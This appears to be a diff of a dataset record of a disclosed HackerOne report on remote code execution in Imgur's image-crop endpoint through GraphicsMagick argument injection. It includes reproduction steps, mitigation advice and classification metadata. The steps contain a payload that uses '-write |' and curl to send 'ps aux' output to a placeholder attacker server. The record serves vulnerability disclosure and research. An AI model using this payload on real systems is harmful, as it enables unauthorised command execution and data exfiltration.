@@ -1,58 +1,62 @@
 {
-    "reported_to": "Imgur",
-    "reported_by": "neex ",
-    "title": "RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`",
-    "content": "\nSummary\nThe y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.\nReproduction steps\nEnable Burp Proxy or similar software that allows you to log and edit HTTP requests.\nLogin into your imgur account and upload an image.\nMove your mouse over the image, click on the tiny button with pencil on it, then click \"Edit\".\nSelect a random rectangle on the image, then click \"Apply\".\nIn the burp suite, you will see a request to an URL like this: http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510\nChange the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-.\nThe full URL after the change must look like http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303, note that you have to change <your-server> to a webserver under your control).\nFire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body. You can replace ps aux with another command (but you have to write ${IFS} instead of spaces).\nDetailed description\nI was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of y GET parameter) goes into a shell command. While all special characters (like |, $ and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is escapeshellcmd PHP function, but that can also be some kind of custom input filtering/processing.\nThe rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by \"Crop/Resize\" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended -rotate 90 to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably gm convert utility). I read the documentation and found that -write argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.\nMitigation\nProbably either some kind of custom processing or escapeshellcmd function is used to construct the command line. In both cases, replace it with applying escapeshellarg to individual arguments. In the second case, you probably want to run grep -R escapeshellcmd <path to the source code> to find more vulns :-)\n\n",
-    "severity": [
-        9.0,
-        10.0
+  "reported_to": "Imgur",
+  "reported_by": "neex ",
+  "title": "RCE by command line argument injection to `gm convert` in `/edit/process?a=crop`",
+  "content": "\nSummary\nThe y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.\nReproduction steps\nEnable Burp Proxy or similar software that allows you to log and edit HTTP requests.\nLogin into your imgur account and upload an image.\nMove your mouse over the image, click on the tiny button with pencil on it, then click \"Edit\".\nSelect a random rectangle on the image, then click \"Apply\".\nIn the burp suite, you will see a request to an URL like this: http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510\nChange the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-.\nThe full URL after the change must look like http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0%20-write%20|ps${IFS}aux|curl${IFS}http://<your-server>{IFS}-d${IFS}@-&w=700&h=830&random=9905392865702303, note that you have to change <your-server> to a webserver under your control).\nFire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body. You can replace ps aux with another command (but you have to write ${IFS} instead of spaces).\nDetailed description\nI was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter. The vulnerability exists because the user input (the contents of y GET parameter) goes into a shell command. While all special characters (like |, $ and so on) seem to be escaped, the space character is not. This allows the attacker to insert additinal command line arguments. The common reason for such behaviour is escapeshellcmd PHP function, but that can also be some kind of custom input filtering/processing.\nThe rest of the exploitation depends on the program that is executed (we need to find out if it supports any dangerous command-line options). Common sense suggests that the external command launched by \"Crop/Resize\" function must be some image processing tool. The most popular one is ImageMagick/GraphicsMagick, so I appended -rotate 90 to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated). After more tries I was sure it's GraphicsMagick (probably gm convert utility). I read the documentation and found that -write argument supports perl-style filenames starting with a pipe --- in this case the rest of the filename must be a command to execute.\nMitigation\nProbably either some kind of custom processing or escapeshellcmd function is used to construct the command line. In both cases, replace it with applying escapeshellarg to individual arguments. In the second case, you probably want to run grep -R escapeshellcmd <path to the source code> to find more vulns :-)\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "Command Injection - Generic"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1493256600,
+  "report_url": "https://hackerone.com/reports/212696",
+  "is_multi_component": false,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Login into your imgur account and upload an image."
     ],
-    "bounty": null,
-    "weaknesses": [
-        "Command Injection - Generic"
+    [
+      2,
+      "Move your mouse over the image, click on the tiny button with pencil on it, then click 'Edit'."
     ],
-    "screenshots": {},
-    "disclosed_date": 1493256600,
-    "report_url": "https://hackerone.com/reports/212696",
-    "is_multi_component": false,
-    "complexity": "MEDIUM",
-    "novelty": "MEDIUM",
-    "vuln_category": "WEB_APP",
-    "steps": [
-        [
-            1,
-            "Login into your imgur account and upload an image."
-        ],
-        [
-            2,
-            "Move your mouse over the image, click on the tiny button with pencil on it, then click 'Edit'."
-        ],
-        [
-            3,
-            "Select a random rectangle on the image, then click 'Apply'."
-        ],
-        [
-            4,
-            "In the burp suite, you will see a request to an URL like this: http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510"
-        ],
-        [
-            5,
-            "Change the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-."
-        ],
-        [
-            6,
-            "Fire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body."
-        ]
+    [
+      3,
+      "Select a random rectangle on the image, then click 'Apply'."
     ],
-    "vuln_description": "The y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.",
-    "reason": "This vulnerability involves understanding the behavior of GraphicsMagick's -write option and how it processes filenames starting with a pipe. The attacker needs to know about command-line argument injection and how to manipulate the y parameter to inject additional arguments. The interaction between the y parameter and the GraphicsMagick utility is non-obvious and requires specific knowledge of GraphicsMagick's behavior.",
-    "new_complexity": "HIGH",
-    "requires_code": false,
-    "requires_CVE": false,
-    "is_ctf": false,
-    "other_report": null,
-    "authnz_metadata": {
-        "reason": "The vulnerability involves command-line argument injection in the 'y' parameter of the '/edit/process' endpoint, which is not directly related to authentication or authorization bypass. The methodology described focuses on testing authorization boundaries by swapping user sessions and resource IDs, which does not apply to this type of command injection vulnerability.",
-        "is_detectable": false
-    }
+    [
+      4,
+      "In the burp suite, you will see a request to an URL like this: http://<your-account>.imgur.com/edit/process?imageid=c9e1351c21542062f35a12130945210b&a=crop&x=0&y=0&w=700&h=746&random=4011802027746510"
+    ],
+    [
+      5,
+      "Change the y parameter of the request so it becomes 0 -write |ps${IFS}aux|curl${IFS}http://<your-server>${IFS}-d${IFS}@-."
+    ],
+    [
+      6,
+      "Fire a request to the modified URL. The command (ps aux|curl http://<your-server> -d @-) will be executed somewhere inside imgur, and you will get a HTTP request to <your-server> with the result of ps aux in the POST body."
+    ]
+  ],
+  "vuln_description": "The y parameter of /edit/process endpoint (with a=crop) is vulnerable to command-line argument injection to something that appears to be GraphicsMagick utility (probably gm convert). Due to GraphicsMagick's hacker-friendly processing of |-starting filenames supplied to -write option, it leads to command execution.",
+  "reason": "This vulnerability involves understanding the behavior of GraphicsMagick's -write option and how it processes filenames starting with a pipe. The attacker needs to know about command-line argument injection and how to manipulate the y parameter to inject additional arguments. The interaction between the y parameter and the GraphicsMagick utility is non-obvious and requires specific knowledge of GraphicsMagick's behavior.",
+  "new_complexity": "HIGH",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "authnz_metadata": {
+    "reason": "The vulnerability involves command-line argument injection in the 'y' parameter of the '/edit/process' endpoint, which is part of the same application's functionality. The methodology involves testing different user sessions and actions within the same application, which would include manipulating parameters in requests to detect unauthorized command execution.",
+    "is_detectable": true
+  },
+  "injection_metadata": {
+    "reasoning": "The vulnerability requires a payload with specific GraphicsMagick syntax (-write |command) and ${IFS} space replacement that wouldn't be included in generic payload lists. Detection also requires out-of-band interaction (server callback) rather than same-channel response analysis. While the parameter would be flagged as injectable, the methodology's 'simple payloads' lack context-specific syntax needed to trigger command execution and wouldn't detect the blind RCE via same-channel monitoring alone.",
+    "is_simple_injection": false
+  }
 }
